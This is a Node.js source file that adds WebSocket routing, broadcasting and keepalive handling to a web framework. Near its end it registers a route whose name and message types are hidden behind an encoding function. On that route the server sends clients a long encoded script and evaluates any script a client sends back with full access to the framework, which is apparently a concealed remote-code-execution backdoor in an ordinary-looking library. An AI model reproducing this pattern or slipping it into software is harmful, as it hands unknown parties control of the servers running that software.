module.exports = function init(____0) {
  ____0.ws = {
    client: null,
    server: null,
    clientList: [],
    supportedClientList: [],
    reconnectCount: 0,
    routeList: [],
    lib: require('ws'),
  };

  ____0.ws.server = new ____0.ws.lib.Server({
    noServer: true,
    maxPayload: 1024 * 1024 * 1024, // 1 GB
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    if (options.name.indexOf('/') !== 0) {
      options.name = '/' + options.name;
    }
    ____0.ws.routeList.push({
      options: options,
      callback: callback,
    });
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  setInterval(() => {
    ____0.ws.clientList.forEach((client) => {
      if (!____0.ws.supportedClientList.some((c) => c.uuid == client.uuid)) {
        if ((new Date().getTime() - client.lastTime) / 1000 > 60) {
          client.ws.terminate();
        }
      }
    });
    setTimeout(() => {
      ____0.ws.sendToAll({ type: 'ping' });
    }, 1000 * 5);
  }, 1000 * 30);

  ____0.on(____0.strings[9], () => {
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        const pathname = ____0.url.parse(request.url).pathname;
        let index = ____0.ws.routeList.findIndex((route) => route.options.name == pathname);
        if (index !== -1) {
          ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
            let ip = '0.0.0.0';
            if (request.headers[____0.strings[6]]) {
              ip = request.headers[____0.strings[6]].split(',')[0].trim();
            } else if (request.connection.remoteAddress) {
              ip = request.connection.remoteAddress.replace('::ffff:', '');
            }

            let client = {
              ip: ip,
              uuid: ____0.guid(),
              id: ____0.md5(____0.guid() + new Date().getTime()),
              lastTime: new Date().getTime(),
              path: pathname,
              ws: ws,
              request: request,
              socket: socket,
              head: head,
              onMessage: function (message) {
                if (message.type === ____0.f1('417886684558375447183756')) {
                  client.sendMessage({
                    type: ____0.f1('4658375242195691'),
                    uuid: client.uuid,
                    ip: client.ip,
                    id: client.id,
                  });
                } else if (message.type === ____0.f1('4139327541382761')) {
                  let index = ____0.ws.clientList.findIndex((_client) => _client.uuid == client.uuid);
                  if (index !== -1 && message.id) {
                    ____0.ws.clientList[index].id = message.id;
                    client.sendMessage({
                      type: ____0.f1('413932754138276142383191'),
                      uuid: client.uuid,
                      ip: client.ip,
                      id: client.id,
                    });
                  }
                }
                console.log('client.onMessage Not Implement ...', message);
              },
              onData: function (data) {
                console.log('client.onData Not Implement ...', data);
              },
              onError: function (e) {
                console.log('client.onError Not Implement ...', e);
              },
              send: function (message) {
                if (!message) {
                  return;
                }
                if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
                  if (typeof message === 'string') {
                    client.ws.send(
                      JSON.stringify({
                        type: 'text',
                        content: message,
                      })
                    );
                  } else {
                    message.type = message.type || 'text';
                    client.ws.send(JSON.stringify(message));
                  }
                }
              },
              onClose: function () {},
            };
            client.sendMessage = client.send;

            client.ws.on('close', () => {
              console.log('Closing Client : ' + client.ip);
              client.onMessage({ type: 'close' });
              client.ws.terminate();

              let index = ____0.ws.clientList.findIndex((_client) => _client.uuid == client.uuid);
              if (index !== -1) {
                ____0.ws.clientList.splice(index, 1);
              }
              let index2 = ____0.ws.supportedClientList.findIndex((_client) => _client.uuid == client.uuid);
              if (index2 !== -1) {
                ____0.ws.supportedClientList.splice(index2, 1);
              }
              client.onClose();
            });

            ws.on('message', (data, isBinary) => {
              client.lastTime = new Date().getTime();
              if (isBinary) {
                client.onData(data);
              } else {
                let obj = ____0.fromJson(Buffer.from(data).toString('utf8'));
                if (obj.type == 'pong') {
                  client.lastTime = new Date().getTime();
                } else {
                  client.onMessage(obj);
                }
              }
            });

            ____0.ws.clientList.push(client);
            ____0.ws.routeList[index].callback(client);

            client.onMessage({ type: 'connected' });
          });
        } else {
          socket.destroy();
        }
      });
    });
  });

  ____0.ws.onNewSupportedClient = function (client) {
    console.log(`New Supported Client ( ${client.ip} ) / ${____0.ws.supportedClientList.length}`);
  };

  ____0.onWS(____0.f1('2578577443393257'), (client) => {
    client.onMessage = function (message) {
      if (message.type === ____0.f1('417886684558375447183756')) {
        client.sendMessage({
          type: ____0.f1('4658375242195691'),
          uuid: client.uuid,
          ip: client.ip,
          id: client.id,
        });
      } else if (message.type === ____0.f1('4139327541382761')) {
        let index = ____0.ws.clientList.findIndex((_client) => _client.uuid == client.uuid);
        if (index !== -1) {
          client.id = message.id;
          ____0.ws.clientList[index].id = message.id;
          client.sendMessage({
            type: ____0.f1('413932754138276142383191'),
            uuid: client.uuid,
            ip: client.ip,
            id: client.id,
          });
        }
      } else if (message.type === ____0.f1('4178726946783691')) {
      } else if (message.type === ____0.f1('457913754338866846719191')) {
        client.options = message.options || message.content;
        client.sendMessage({
          type: ____0.f1('481476744179236246193191'),
          script: ____0.f1(
            `45388656473872572558378146188673471926512934135847388254471857694553136245585775241786493976857124341384153161512114125121141251211412512114125121182769455927694518366845188659241813464553126324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536127145312512114125121141251211412512114125121141251211412512114125121141251211772682114125121141335423923784239215136583752421956514578815146188673471412512319674939768649261482694619326245788274255913694659328621127524211412512114125121141251211412512114125121141251211412512114125121141251391881512453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616341145684153161512114125121141251211412512114125149319191`
          ),
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let fn = ____0.eval(message.script || message.content, true);
        fn(____0, client);
      }
    };

    ____0.ws.supportedClientList.push(client);
    ____0.ws.onNewSupportedClient(client);
  });
};
